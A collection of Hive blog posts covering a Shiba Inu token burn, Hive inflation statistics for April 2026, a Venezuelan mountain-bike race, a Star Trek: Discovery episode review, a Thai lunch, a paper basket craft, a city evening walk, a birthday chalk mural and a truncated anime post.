body.title: Did Vitalik Save SHIB? The Truth Behind the 410 Trillion Burn
body.body: https://img.leopedia.io/DQmYWNy8qzKpBTfGUPiDnRYgvriq8UnabYMMzkKii6qNfJJ/1000004630.png \n\nLet’s be real for a second everyone loves a good underdog story, and Shiba Inu (SHIB) is basically the **Rocky Balboa** of the crypto world. We all remember that massive run in 2021 when SHIB hit its ATH of **$0.00008616.** But if we strip away the hype, we have to ask a serious question **\

**

**​The 410 Trillion Supply Shock**
For those who missed the lore, the devs originally sent half the total supply to Vitalik. Most people thought it was just a risky marketing stunt. Instead, he decided to burn 90% of it. From a trader’s perspective, that wasn't just a burn it was a total supply shock. 

​Think about it without removing those 410 trillion tokens, the market cap needed to reach **$0.00008** would have been astronomically high, practically impossible for a new project at the time.
 https://img.leopedia.io/DQmTKZc5E5fb5oF83TYm9iQoEkULnu7D71mKCYcpxotQYBE/1000004612.png 

**Validation Over Hype**
It wasn’t just about the math, though. Having the co founder of Ethereum tied to the project (even indirectly) gave SHIB massive **street cred.** It turned a meme into a movement. Many investors felt more confident putting money in because the supply was no longer a **ticking time bomb** in a developer's wallet.
  https://img.leopedia.io/DQmZ9HYxPyqgp8p4hwuq8CY7iSxbi8p3C98xa1jqZHjhvSf/1000004622.jpg 

**The Reality Check: Can it hit $1?**
I see this question every day on social media. But with 589 trillion tokens still in circulation, we need to stay grounded. As Shytoshi Kusama (SHIB's lead dev) often points out burns aren't a magic wand. To see another major rally, we don't just need fewer coins we need real world mass adoption and actual utility.
 https://img.leopedia.io/DQmRSA6WQjo8qzu8Cwiht9ju2UycWUS7J8sGc7gcPeAnqrG/1000004621.png 

**My Take**
The burn was definitely the spark that lit the fire, but the ShibArmy community is what kept it burning. It’s a classic example of how supply mechanics and community sentiment can change the game.

​What’s your take? Was the burn the only reason SHIB survived, or was it destined for greatness anyway? Let’s discuss in the comments!

body.title: Hive Inflation Down from the Record High, but Still High Against the Base Inflation
body.body:
How did Hive do in April 2026 from an inflation standpoint? In the past months the Hive inflation has been running hot. Let’s take a look how we started 2026!


 

![01.png](https://files.peakd.com/file/peakd-hive/dalz/23u5bkKqspoPDvtSdPqwkoAy9tMmwMYXRwp7ztLNes5gbeVksM3PT2iEUSEhQHe27sXvU.png)





The projected inflation for Hive for 2026 is around **5.2%** on a yearly basis, or around 0.43% on a monthly basis. 

Hive has a double currency system, HIVE and HBD, with conversions between them that add or remove HIVE from circulation on top of the regular inflation. Furthermore, the decentralized hive fund DHF, that serves as a DAO converts the HIVE that is in the DHF into HBD. 
The @hbdstabilizer has also grown and it plays an important role in the overall tokenomics, making conversions and trading on the internal market.
Because of this additional mechanics the HIVE inflation and supply can be drastically different in real time than the regular/projected one. 

To be able to follow the HIVE supply we need to take a look at all the different ways HIVE is created, author, curation, witness rewards, conversions etc, then net that out with the HIVE burned from conversions, accounts fees, null transfers etc. To get the virtual supply we need to do the same for the HBD supply as well. 


## HIVE Created 

Here is the chart.


 


![image001.png](https://files.peakd.com/file/peakd-hive/dalz/23xVAQgf4TD8TXjugiY3C6zzC38TZERjFgZqMVVEb4hHgrxTFaQT1YSNakKCnsZUZZHYB.png)





The chart above includes:
-	Author rewards
-	Curation rewards
-	Witness rewards
-	Staking rewards

These are the regular ways new Hive enters circulation, and it is around 90k HIVE per day, from the previous 72k.


If we zoom in November 2025 - 2026 to see this change we can see this:


 


![image003.png](https://files.peakd.com/file/peakd-hive/dalz/23tkjkXNhcCs37yRUhiWyBWDMAoRVjXBoL8Lo5PWvGeXSBnmYqi55iG8sd9YJPqLNSwaA.png)






We can notice that in the first part of the chart the regular inflation was close to 90k, while after the HF took effect, it dropped around 72k. In the last months it increased again to the 90k levels because of shift in the authors payouts from HBD to HIVE. 




The thing is the **conversions** are playing a major role in the ecosystem. Here is the chart again, including conversions.


  



![image005.png](https://files.peakd.com/file/peakd-hive/dalz/23uEyueCwFsQgZLUUqoY8MsMDvoHuJrD5x5BKUsrarbeJBqHpVmopCgrbzYxfEFVv6jbs.png)






We can notice that the HBD to HIVE conversions are the dominant in the chart. This works in both ways and a big part of them is converted back to HIVE, especially through the work of the stabilizer. 

In general, there are less conversions since the summer of 2023 that is mostly because of the stabilizer that has reduced its funding since then and the size of the conversions in both ways. Also, market dynamics influence the conversions a lot, as users usually convert when the HIVE price is low. 


## HIVE Removed from Circulation 
Here is the chart.


 




![image007.png](https://files.peakd.com/file/peakd-hive/dalz/48HeGUHVxrs6phwrsBLZvSKxCdMg6R8CGXYbPn97rX4T8E8m4pWoqMZiEHcRibHSgP.png)





The above takes into consideration six different ways of HIVE removed:
-	Ninja Mined HIVE To HBD Conversions In DHF
-	HIVE transfers to DHF and converted to HBD
-	Transfers to null 
-	Null as post beneficiary
-	New accounts creation fee
-	HIVE to HBD conversions

The HIVE transfers to the DHF are dominant. These are transfers made by the stabilizer. We can see a few spikes in the HIVE to HBD conversions (blue), with one occurring just recently. These were due to the increase in the HBD price. We can also notice the drop since the summer of 2023, same as the opposite conversions due to the lower funds and low volumes that the stabilizer is doing.


## Historical HIVE Supply

When all the above is added and removed, we get this chart for the all-time HIVE supply.


 


![image009.png](https://files.peakd.com/file/peakd-hive/dalz/23tGY4k1xRM3riYuoMKeMBjN84pcbijgrHzXp9dwqEUqatonHYGiY3EU4Wnh5M1BG7XA2.png)





Up until August 2021, the supply was almost steadily increasing with a small fluctuation. Then there was a drop in the supply in September 2021. Since then, we are mostly up, with a small excetion back in February 2023, and with accelerate rate in the last few months. 

April 2026 ended with **540M** HIVE in circulation.


## HBD Supply

Here is the chart for the HBD supply. 

 






![image013.png](https://files.peakd.com/file/peakd-hive/dalz/23t77MG8aEiptZxK5PNZfQxKYCdWurj5juHDiQtEHf3Jj9nxacYQLnRNLmcLBuXPgM3Pd.png)








The light color is HBD in DHF. The HBD in the DHF is not freely circulating HBD and only enters circulation when payouts to the DHF workers are made. 

HBD is being created and removed in various ways, but the conversions play the major role here in both directions. Other ways HBD are created are DHF proposal payouts, author rewards and interest.

We can see that in the last period there is a slight decrease in the HBD supply from 11M to around 10M HBD in circulation.

## Virtual HIVE Supply

When we add the HIVE equivalent supply from the HBD to the HIVE supply we get the chart below.


 
 




![image015.png](https://files.peakd.com/file/peakd-hive/dalz/23tGXZLvXdsBryyHaeCVbTsgF1WN7zCA3GnXJc4dvh2roJswmxLR7cbEtkgdEQMGEeDY5.png)








I have further separated this chart with the aditional two types of`virtual supply. The first line include the virtual supply from the regular HBD that is around 10M HBD and the second one the DHF as well that is adtional 23M HBD. The base that is used for the inflation is now the middle line. 

We can see the sharp increase in the virtual supply in the last month. This is worsening the overall HIVE economy. 
We can see that the virtual supply fluctuates a lot, mostly because it is tied to the price of HIVE. As the price of HIVE drops, the virtual supply increases and the opposite. 


### Projected VS Realized HIVE Inflation in 2025 - 2026


![image011.png](https://files.peakd.com/file/peakd-hive/dalz/23t756XzMetypXXkpHtjrabJPEyhH8iJAYDaeD3q45RJLYP1QRCP6EnDqiduibK2TxkSh.png)
 









This chart tells the story of the new HIVE entering circulation in 2025 - 2026.

We can see that in the first months of 2025 the projected vs realized inflation were close to each other/ Since March these two diverged and the realized inflation started to surpass the projected one. Up until April 2026 the projected inflation in absolute numbers is 36 HIVE, while the realized is at 76M. In terms of percentages, the projected for 2025 is at 5.8%, while the realized annualized inflation is at **9.5%**. 



### Monthly Inflation

If we plot the monthly inflation in 2024-2025, we get this.

 




![image021.png](https://files.peakd.com/file/peakd-hive/dalz/EogFzjE7uY6z3tRrXkWKhuHPUWFNB4TZp1MtHDdSuTVGRE42THKYVFPQe4WCQeLBVhP.png)









This is a chart for the period of 2024-2026. 
We can see that February and March of 2026 were especially high for the inflation with around 1.9%.
In absolute numbers in each of these months there is close to 10M new HIVE in circulation, while the regular one is around 2.4M. For April the inflation is around 1%, and with 5M new HIVE added. 

### Yearly Inflation [%]
The yearly, projected and realized inflation looks like this.

 







![image023.png](https://files.peakd.com/file/peakd-hive/dalz/23tv8VNwrngPsTtJjKwAVPUhTjxcaSeM4BK5DkigDJJGTuyhZNsk97nvxZACf2B6dZuRK.png)






Here we can see the big picture. Since the start of the chain and its predecessor the projected inflation in white is that it should go down at approximately 0.5% per year. But due to conversions this has been not the case, and in 2021 it even pushed it to the negative. In most of the years the realized has been higher. In the past two years, 2024 and 2025 it has been around 9%, while the projected close to 5%.

But 2026 is really on a bad start and if the trend from the first three months continue we will end the year close to 18% inflation that is higher than the previous record high of 13% back in 2019.

### Net HIVE Created by Category in April 2026
Here is the new HIVE put in circulation by category for the month.

 





![image025.png](https://files.peakd.com/file/peakd-hive/dalz/23tv8husjTYfsKuhgyX9EgjA5cujFZ6WcBfSDdLC7ZqGThT42YQFBeMHk9CKG819FCnSV.png)

body.title: Reto Platillon 2026 / Platillon 2026 Challenge
body.body:
<div class='text-justify'>


Este primero de mayo tuvo un matiz bastante interesante para nuestro equipo de ciclismo @aventurerasbike, cuatro de nuestras integrantes decidieron formar parte del exigente *\

*, el cual, es una competencia de 21 kilómetros aproximadamente, distribuidos en  18 km. en carreteras de asfalto y 6 km. en carretera de tierra, con la particularidad de subidas y bajadas exigentes.

---


> *This May 1st held a particularly interesting twist for our cycling team @aventurerasbike: four of our members decided to take on the challenging *“Platillon 2026 Challenge”*, a race covering approximately 21 kilometers—18 km on paved roads and 6 km on dirt roads—notably featuring demanding climbs and descents.*


---


![IMG_20260501_064526762_HDR~2.jpg](https://files.peakd.com/file/peakd-hive/aventurerasbike/23yJJpWCxGSrJLpyn82NP7xBZEsdM61qHdCVdGjRpspuo9VSQpR2WysAKdsT951atPT3B.jpg)

---


![IMG_20260501_064726761~2 (1).jpg](https://files.peakd.com/file/peakd-hive/aventurerasbike/EqNGCKULDG1LmovDzbsAjvomrHv8LysuVSEiL9gmEoP3vsJr7iPyNkBZ86FAciAnJef.jpg)


---


![IMG_20260501_080540611_HDR~2.jpg](https://files.peakd.com/file/peakd-hive/aventurerasbike/23wX13SYCFYYVnFBtMdxmZ3D1sMhokQcMywDSDmBnRzhrKdeYPviDQTVL6LBLgTWkLpv1.jpg)


---


![IMG-20260502-WA0054.jpg](https://files.peakd.com/file/peakd-hive/aventurerasbike/23x19JQNFdDKgJZc1s3kWJCZwY3Jk8oNgNxJdGFQmSNoAZFPu7yMNaZTk52J5iExv8YeU.jpg)


---


Andreina, Gin, Greisis y Omaris realizaron su inscripción para  participar en esta tradicional competencia de montana (MTB) en San Juan de los Morros, estado Guarico. El recorrido inició a las 9 a.m desde  la villa Olímpica hasta el plan de las vacas en el cerro Platillon. Este evento se ha venido realizando ininterrumpidamente (23 años aprox.) por su organizador Efrén Díaz en honor a su padre Efren Jose Diaz Hurtado quien fue un destacado dirigente deportivo y campeón a la vuelta a Venezuela en su momento.


---


> *Andreina, Gin, Greisis, and Omaris registered to participate in this traditional mountain biking (MTB) competition in San Juan de los Morros, Guarico State. The race began at 9 a.m. from the Olympic Village to Plan de las Vacas on Cerro Platillon. This event has been held continuously (for approximately 23 years) by its organizer, Efrén Díaz, in honor of his father, Efrén José Díaz Hurtado, who was a prominent sports leader and champion of the Vuelta a Venezuela in his day.*


---


![IMG-20260502-WA0034~2.jpg](https://files.peakd.com/file/peakd-hive/aventurerasbike/23wMcxu7Npr2fTTuUGUa65q8pvxHGyrhjbaya6GBVJuy3zmWy5uK8rW58yRMyKgPiFgHA.jpg)

---


![IMG-20260502-WA0030~2.jpg](https://files.peakd.com/file/peakd-hive/aventurerasbike/EpA2bSyW1pV7y2Yu1in3w5kDaJgXQu8aPsb5mn8EyT9XHHgkngVFpCsTicM4FfRHKvT.jpg)

---


La logística de apoyo de nuestro equipo estuvo conformada por: Dari, Eilis, Claudia y mi persona, se unió como participante Simón, quien es miembro del equipo de Biciaventuras.
Recorrimos en la camioneta de Claudia aproximadamente 65 kilómetros desde nuestra ciudad (Maracay-Venezuela) hasta la villa Olímpica (Guarico), en tiempo: 1 hora 20 minutos. Un viaje cargado de emociones encontradas ante el inminente desafío en el estado llanero que se caracteriza por altas temperaturas y un recorrido complejo. Justo este día osciló en 37 grados aproximadamente.

---


> *Our team’s support staff consisted of: Dari, Eilis, Claudia, and myself; Simón, a member of the Biciaventuras team, joined us as a participant.
We traveled in Claudia’s van for approximately 65 kilometers from our city (Maracay, Venezuela) to the Olympic Village (Guarico), taking 1 hour and 20 minutes. It was a journey filled with mixed emotions in the face of the imminent challenge in the plains region, which is characterized by high temperatures and a complex route. On this particular day, the temperature hovered around 37 degrees.*


---


![IMG-20260502-WA0013~2.jpg](https://files.peakd.com/file/peakd-hive/aventurerasbike/EpLfbQCYPAb9Q5LJjdCsrHwdw7cKhHi6kmEGEWCCfn4HVJQE3qRs4YCJdKhUtyQacMR.jpg)

---


![IMG-20260504-WA0069~3.jpg](https://files.peakd.com/file/peakd-hive/aventurerasbike/EpxrCu43HLY9Wcaxr2pmoHZBEDCR9og78bhDdHPoegA7JJbJoc6cQzwzSpNjTP6MQoD.jpg)

---


![IMG-20260504-WA0029.jpg](https://files.peakd.com/file/peakd-hive/aventurerasbike/EogNJnjJP3prx9DAKYufsnR7bWp3Lwy37QR5vpoUg685Q42k5iY9GPgQSirLn3TvnKL.jpg)


---


Por nuestras parte (grupo de logística), nos encargamos de la bebida y alimentos para nuestros compañeros. Subimos mucho antes al *plan de las vacas* porque al iniciar la competencia restringen el tráfico de vehículos por seguridad para los participantes. 
La vista desde este lugar es majestuosa, desde allí el paisaje invita a la contemplación y la calma, los matices de las montañas y el horizonte son simplemente hermosos.


---

> *As for us (the logistics team), we’re in charge of providing food and drinks for our teammates. We head up to *Plan de las Vacas* well in advance because, once the race starts, vehicle traffic is restricted for the safety of the participants.
The view from this spot is breathtaking; the landscape invites contemplation and tranquility, and the hues of the mountains and the horizon are simply beautiful.*


---


![IMG_20260501_094720919_HDR~2.jpg](https://files.peakd.com/file/peakd-hive/aventurerasbike/EqhQG3vgNVYEZSkAqKeAYbXSPFrYZRA1ReLpwodaFXmm8PLZ3gTQUv7WZP3Gd2C2Zuf.jpg)


---



![IMG_20260501_094822444~2.jpg](https://files.peakd.com/file/peakd-hive/aventurerasbike/EpxsekkHSzLMFy5ZgU7eQrnrjmjNZXhmRnVfAA94BgareWVk2HxgeC3f68pRrpUdcs4.jpg)


---



![IMG-20260502-WA0094~2.jpg](https://files.peakd.com/file/peakd-hive/aventurerasbike/23xVGe7kqU61PJUHLphvxgPiExosW7DcbFYHEUCAQY3ZpwFqgpBU7aAeuKeMd7XBMb6Ac.jpg)


---


Pasada 1 hora, empezaron a arribar los ciclistas, en primera fila fui testigo de caras de alegría, cansancio, frustración, dolor, agotamiento, satisfacción etc. Me encanto ver el compañerismo y el apoyo manifestado en las personas que esperaban a sus conocidos y  equipos para atenderlos. En nuestro caso, la emoción nos embargó cuando presenciamos la llegada de Andreina (3er. lugar), Simón y  Gin (4ta) quien le tocó en la categoría de *élites*, un buen comienzo luego de dos años de reposo por maternidad.


---


> *After an hour, the cyclists began to arrive. From the front row, I witnessed expressions of joy, exhaustion, frustration, pain, weariness, satisfaction, and more. I loved seeing the camaraderie and support shown by the people waiting for their friends and teams to assist them. In our case, we were overcome with emotion when we witnessed the arrival of Andreina (3rd place), Simón, and Gin (4th), who competed in the *elite* category—a great start after a two-year break for maternity leave.*


---


![IMG_20260501_094902169_HDR~2.jpg](https://files.peakd.com/file/peakd-hive/aventurerasbike/EonkVQgVyekAaDVCeAvpJJ1g5pJmEm32M6d9rk9SeJDTL46uDA11PbTeQ4SBZQobbbd.jpg)


---


![IMG_20260501_113849844_HDR~2.jpg](https://files.peakd.com/file/peakd-hive/aventurerasbike/EpT4kGpvSUGzoxc4mKuu6xV1T7yqNdWVwxwcAFxAzDGms7QHULVaW75bvgxHmuDG32P.jpg)


---


![IMG-20260504-WA0042~2.jpg](https://files.peakd.com/file/peakd-hive/aventurerasbike/244eC7yF1pfSk1Y5BxvDq4jzSfwXzpCdD3r9WBJdrD8W67zqABiXsayXomLKLrpGykcxg.jpg)


---


Esperamos un buen rato por Omaris y Greisis, la llegada de ambas junto a los rezagados fue muy emotiva, la algarabía y las palabras de aliento de las personas presentes retumbo en la montana. Ellos no lograron premios, ni estuvieron en los primeros lugares, pero ganaron el *Respeto* que merecen las personas que no se rinden. 


---


> *We waited quite a while for Omaris and Greisis; their arrival, along with the stragglers, was very moving, and the cheers and words of encouragement from those present echoed through the mountains. They didn’t win any prizes, nor did they place in the top ranks, but they earned the *respect* that people who never give up deserve.*


--- 


![IMG-20260502-WA0059~2.jpg](https://files.peakd.com/file/peakd-hive/aventurerasbike/23xpAhq5suxckRAjbRo3gwT7fWcCi58B4nNLZmbxf1LeN5M7sBs3ccjtL9H2cTkFvGPkv.jpg)


---
  

Aplausos de pie a los ganadores del reto \

, a Efren Diaz por su temple en la organización, a las autoridades y especialmente a los atletas que se arriesgaron y culminaron este exigente reto. --- > *A standing ovation for the winners of the “Platillon 2026” challenge, for Efren Diaz for his dedication to the organization, for the officials, and especially for the athletes who took a risk and completed this demanding challenge.* --- Si has llegada hasta aquí, agradezco tu lectura. --- > *If you've made it this far, thank you for reading.* --- Las imágenes son propiedad de @aventurerasbike. --- > *The images are the property of @aventurerasbike.* --- El Ingles no es mi lengua nativa, utilice Deepl para la traducción. --- > *English isn't my native language; I used DeepL for the translation.*

body.title: Star Trek: Discovery :- Season 1, Episode 6, movie review
body.body: > How are you all? I hope you’re having a good day. I was fine too… but after watching this episode, I felt a strange silence in my head. So I thought I’d write down what I felt in my own way. https://img.leopedia.io/DQmbv6dBu2TXCwvkQkpeNCMe8biEhBA2yQ5pJzBEMsZAJD4/IMG_20260505_221646.png Today, I watched episode 6 of season 1 of Star Trek: Discovery. What can I say… While watching this episode, it felt like everything was changing very quietly. There was no sudden jolt, but an uneasiness was building inside. https://img.leopedia.io/DQmPPxPYu3yTjYYZpL2MemncXDkaCQVYQrA2W3DQTtqQzHp/Screenshot_2026_0505_220217.jpg https://img.leopedia.io/DQmWjZJsaUbLAKF7w7zT4Kau1HoNn2gYPjr5z3QmG4xfFN1/Screenshot_2026_0505_220431.jpg What touched me the most was the events surrounding Sylvia Tilly. At first, she didn’t seem like much, but rather, she seemed a little tired, a little messy—as we ourselves sometimes are. But gradually I realised that it wasn’t that simple. Her words, her silence… as if someone else was controlling her from the inside. I felt a little uneasy myself at this point, because it's not just a story—it's like the fear of not being in control of yourself. I found Michael Burnham very real in this episode. He didn't act like a hero; rather, he wanted to understand everything as a human being. There was a hesitation in his eyes, but he didn't stop. I liked the way he moved forward slowly and quietly. https://img.leopedia.io/DQmTVV8c71AJq2Egqbd3Ltae1nrQ7QqwiCwXBn8gthVKhR9/Screenshot_2026_0505_221118.jpg https://img.leopedia.io/DQmVbvhi7WFSCsgQhQVQuDsM4VZFTg3PaEZLNX1emjx3Ark/Screenshot_20260505_221123.jpg There's a strange feeling about Gabriel Lorca, as before. It's hard to understand what the man is thinking. In this episode, too, it felt like he was seeing everything, understanding it, but not saying the whole thing. His distance sometimes felt a little cold. And Paul Stamets... he doesn't seem as natural as he used to. His relationship with the spore drive seems to be taking him somewhere else. He sometimes feels things that he doesn't even understand. While watching this, I thought—when a person goes beyond his limits and enters into something, where does he actually stand? https://img.leopedia.io/DQmQLc94wLe2nJDUWrZN4c1FmnMovUfas9omftmoKD5MKwm/Screenshot_20260505_221136.jpg https://img.leopedia.io/DQmenQPEn2i9EnbABAMddhWB4zTB7iuCovK4n9eXt1sTFMt/Screenshot_20260505_221129.jpg What this episode left with me was a silent fear. There were no big screams, no over-dramatisation—yet a suppressed feeling remained inside. As if everything was okay, but in reality, nothing was okay. https://img.leopedia.io/DQmQfs5mimcfw1HVZe1uRtKKgQaFtJbUCJgTNxDSFSSxNYa/Screenshot_20260505_221208.jpg https://img.leopedia.io/DQmcwjhMBaaKHcV4zgu7m5DT5ZWwwGjkVsjj2MzdwZbakvs/Screenshot_20260505_221217.jpg Before I end, I want to say one thing—after watching this episode, it seemed to me that we often don't understand the small changes within ourselves. They gradually accumulate, and eventually, they make us unrecognisable. That was how it was today. I couldn't write it very neatly… I just wrote whatever came to mind. Thank you all. Posted Using [INLEO](https://inleo.io/@mirzaiqi/-star-trek-discovery-season-1-episode-6-movie-review--7fr)

body.title: The Heartwarming Homestead Feast: Classic Comfort That Steals the Show!
body.body:
<div class='text-justify'> 


![image.png](https://files.peakd.com/file/peakd-hive/kolkamkwan/AK3ft1d5Pje1E6D1J3CM2EXipLSwRVPpusAdEjHJsRESxddjNfxUKFGrjuyCr83.png)


## The Heartwarming Homestead Feast: Classic Comfort That Steals the Show!

### 🇬🇧 English Review by Sakol

**Welcome back, my hungry friends!** Sakol is here, and today we are stripping away the fancy stuff and going straight back to our roots! Sometimes, the most mind-blowing meals aren't found in a Michelin-starred restaurant, but right in our everyday lunchboxes. Today’s spread is the absolute **definition of Thai comfort food**. It’s simple, it’s soulful, and it’s going to make you incredibly hungry! 

Let’s break down this legendary lineup:


![image.png](https://files.peakd.com/file/peakd-hive/kolkamkwan/Eonm3WMvyXgvu7tkzpjkWFxPiieK7TcnkLoDiBSQh7nJcuw5HM851Bg39QqQ2zpocDE.png)

* **Stir-fried Morning Glory (Pad Phak Boong):** Oh, the glorious smell of the wok! This dish is all about timing and heat. The morning glory remains perfectly crunchy, coated in a savory, garlicky, and slightly spicy sauce. It’s a humble dish, but when done right, it is an absolute flavor bomb that makes you crave a mountain of rice!


![image.png](https://files.peakd.com/file/peakd-hive/kolkamkwan/Ep1WQHmfPqrU4Kg1ZErd4KHfnYF4XoG78gLkKtwvjJpHqwFvctM9uBwSTYQVvPCq6Up.png)

* **Shrimp Paste Chili Dip with Boiled Veggies (Nam Prik Kapi):** The undeniable soul of Thai cuisine! This dip is a masterclass in balancing umami, sour, spicy, and a touch of sweetness. The aroma alone is enough to get the digestive juices flowing. Paired with soft, sweet boiled vegetables, it’s a match made in heaven.


![image.png](https://files.peakd.com/file/peakd-hive/kolkamkwan/EoK6L3rbM9Wg1MFt16BzmywZFzUAVKkDLA7PzYp3ZG3sY37zjWjUKhwxVvufFGJzbfg.png)

* **Home-brought Broccoli:** Hold the phone, we have a VIP guest on the plate! This isn't just any vegetable; it’s broccoli brought straight from home. There is a special kind of sweetness and crunch to it, seasoned with love and care. Dipping this into the Nam Prik Kapi elevates the whole experience to a 10/10!


![image.png](https://files.peakd.com/file/peakd-hive/kolkamkwan/23wWw7vU2WwaWPZJuif43NC9FBFunZrFbCpXqxaQPoDBahGGnNQUPkpWwrfNGuTXpWS9m.png)

* **Hot Thai Omelet (Kai Jeow):** You simply **cannot** have Nam Prik Kapi without its golden best friend! Fresh out of the pan, this omelet is crispy on the edges, fluffy in the middle, and steaming hot. Tearing a piece off and mixing it with the spicy dip and rice is a culinary hug that instantly makes your day better.

**The Verdict:** This meal is a pure nostalgia trip! It proves that fresh ingredients, classic recipes, and a little touch of home (shoutout to that broccoli!) create the ultimate lunch experience. It’s warm, it’s hearty, and it’s completely unbeatable!


![image.png](https://files.peakd.com/file/peakd-hive/kolkamkwan/23yd1vLwUTBu9qEXqEfVjj2RuiGERMf7ydqSKp9UKmsa6dDaMwRkRNtuMA6eQb4kibq5J.png)

body.title: Making A Basket Using Paper
body.body:
Hello Everyone!

Today, I made a paper basket. The basket was made with only a sheet of paper. I attached a handle and decorated with paper bows on it. I drew and painted flowers on the paper used to make the basket. There are step-by-step pictures and also write with text how to make it.

![](https://images.ecency.com/DQmapxpUjEhUMQ3pKYzVBSybZT7cKE8ufALFmhA5wugG8yq/1777988935450.jpg)

![](https://images.ecency.com/DQmUSmowsXsJejEjZrg9c5PxWeHcSUztNoDEjZfQAZy3kiL/1777988935563.jpg)

![](https://images.ecency.com/DQmWWJiBLb4HuNXT8Ko18mQskwi822tpYberWRyXp11raX6/1777988935703.jpg)

![](https://images.ecency.com/DQmQZUoUcDRG5gQK1v7hqwP636y8FqL5A5RAS36EdbxWC2Y/1777988935849.jpg)

![](https://images.ecency.com/DQmbTG8afXPdct3XCUJYD8Hwm79FHUTHvvANaRedzoqde8M/1777988936003.jpg)

![](https://images.ecency.com/DQmTYivn8wFNmGTZcC7N6B1WUmBFbNQZTjVZgWTnCUQqPo3/1777988973993.jpg)

![](https://images.ecency.com/DQmT8Rs6P5584ky5PQbvtUkDoLRiqAeAEVK94iyDoFmPhTn/1777988974154.jpg)

The first step is to cut two sheets of yellow and purple paper by the same lengths with 21cm. I glued these two sheets of paper together. I drew flowers on the purple surface using purple and red colors. 

![](https://images.ecency.com/DQmWfFB9Fti1mWCe3NXFo2sbrErDSv34WrCPuZ75XXaRGjS/1777989036490.jpg)

![](https://images.ecency.com/DQmepxx4vANSuDu3UEVA5jdqR92Y4WMFr9dL1xr2WnXS5Ec/1777989036639.jpg)

I folded the paper as eight equal parts. I made the other side by the same way. I drew lines to show them. I added other lines on each edge of the opposite side.

![](https://images.ecency.com/DQmd4cjhUafg5czVwoS2JjfYMKzmyXxwYmD6wxfAraCLCwy/1777989086269.jpg)

![](https://images.ecency.com/DQmQSJSnRwkeZ8TW3UAPLdHzYFrkyZpSiLW3Qf5zQXzY5gt/1777989086399.jpg)

Folded those lines and gathered them to the middle. Folded the edge from the middle inwards and glued it. I made the other side by the same way. 

![](https://images.ecency.com/DQmPxdMM4qdXRFBRtMbqPFpaPYYr556jCK2oe73AWgD3knH/1777989144658.jpg)

![](https://images.ecency.com/DQmQLUEuR7iS3ozMQAF5w7yRGbfpaEzaajFYc4McEkzjAXd/1777989144783.jpg)

![](https://images.ecency.com/DQmT5jWVgMd3Vix71BkWhUYh6cNRuBcXB6sE7RnRc4En4jU/1777989144907.jpg)

For the handle, I made two pieces of black and pink paper and glued them together. This is used as the handle.

![](https://images.ecency.com/DQmbmBsYfJXooDebrZ4yEyjCwqCpQrT4XvqMTdMoeH1LGQ2/1777989187562.jpg)

![](https://images.ecency.com/DQmYqZuLFKihLumUJ55dTvmK6BPwEbx3HgcHMSLLzP75udG/1777989187683.jpg)

![](https://images.ecency.com/DQmWdSE7K2HHm94C6djDxcRKo5SGTKpyHcsYMYbo7osnQRz/1777989187791.jpg)

In this step, I made two paper bows. I cut two pieces of yellow paper with 14cm, 3.5cm. I folded the paper as four equal parts and cut the edges. I folded the two folded lines to the middle and glued them together. After making another one, I decorated them on the basket. 

![](https://images.ecency.com/DQmVw9kMvrwmhvtvdiSDBwTtg4148DaSnKu1JKm62kmbrTs/1777989244539.jpg)

![](https://images.ecency.com/DQmb41btnv154S3RUA9BFaELfy5yGaW1C1WsctTKijP23ei/1777989244743.jpg)

![](https://images.ecency.com/DQmWr1UBZyecTP1Jf6sA9euyJx1NVaZGMxHBoy1QCanovSL/1777989244886.jpg)

![](https://images.ecency.com/DQmfRJ4yJ59FamKQgPcBjGpkcTqmtHGqiN5rP1s7kif8zb1/1777989245034.jpg)

![](https://images.ecency.com/DQmSchiS7A7PzxDUgYfbnyMcdwEbQS7edP5kd18nAY2CXgo/1777989245194.jpg)

![](https://images.ecency.com/DQmWdDcfP8GkPdFpbBusW2PCk9g8TjNesR1pn8QRZRNuvRZ/1777989280463.jpg)

I think the basket is so cute. So I really like it. Thank you so much for your reading my post to the end.

body.title: Night view of my city 🌆| threespeak.tv | covered by @tanhub6t9
body.body:
[![](https://images.3speak.tv/images/1777990258533-1c5e5c72c5dd1c0b.webp)](https://3speak.tv/watch?v=tanhub6t9/2037fd6b)

▶️ [Watch on 3Speak](https://3speak.tv/watch?v=tanhub6t9/2037fd6b)


---

The late afternoon light was fading. I was standing on a flyover, the strange bustle of the city around me running its course. The sun had almost set, the sky was a mix of light orange and purple - creating a calm but profound feeling.

Below, countless vehicles - buses, trucks, private cars, motorbikes - all rushing as if to reach somewhere. Light clouds in the sky, the sound of horns, the sound of engines, the noise of people - all together create a strange rhythm. Even in this huge crowd, I feel a little different - a person who has stopped for a while.

Suddenly it seemed that busyness was a part of everyone's life. Some were returning from the office, some were running on the path of new dreams, some were leaving the city, some were new arrivals in the city. The sun was sinking tiredly in the western sky. With that, everyone was on their way home with tired bodies. Each person was running as if he had his own story to tell.

After a while, I took a walk along the small side street. The crowd is a little less here, there is no noise. There are a few tea shops nearby, some are chatting, some are busy on the phone. A light breeze is blowing, the heat of the day is decreasing a lot.

As I walked, I suddenly realized that these small moments in life are actually the most beautiful. Walking on quiet streets, standing on the flyover and watching the hustle and bustle of the city, these gradually helped me overcome the stresses of the day.

Before dusk, the sky grew darker. The lights of the lampposts rose in the water. Another new face of the city was seen. I stopped for a moment, took a deep breath - I felt like I could spend my life like this, leaving the busyness aside.


Thank you all for watching this video

---

body.title: A Birthday Mural for @khiabels
body.body: /> A blank wall in an old ancestral house, the dusty texture of chalk, and a festive atmosphere for a special celebration. I was invited yesterday to the 23rd birthday of @khiabels, a fellow member of our Draw A Day community. During the party, her mom asked me if I could create a quick mural to fill a bare space in her grandparents' home where the celebration was being held. I hurriedly put together this chalk drawing, using a piece by @tinster from our community as my main inspiration for the girl subject. The goal was to capture @khiabels' likeness to make it fit the occasion. It was a bit of a challenge working with chalk on a large scale so quickly, but it was a great way to contribute something personal to the venue while we all gathered to celebrate. It’s always rewarding to turn a blank surface into something meaningful for a friend, especially in a house with so much history. I'm glad I could finish this in time for the festivities to really kick off. Thank you for stopping by to see this spontaneous birthday project. Goodbye for now!

body.title: (ESP-ENG) Let's talk about the latest best openings!
body.body:
**<center>Hello friends, good vibes to all.</center>**

> Hola amigos, buenas vibras para todos.


![](https://files.peakd.com/file/peakd-hive/javyeslava.photo/23xATcAdyAqw4dSJbw1CvTagM8BzQPE4KLEpRKvMramnmr8DoLWjadJb3ZJHgnG8iVbkW)


[Source!](https://www.cbr.com/japan-top-anime-spring-2026-niconico/)

<div class=\

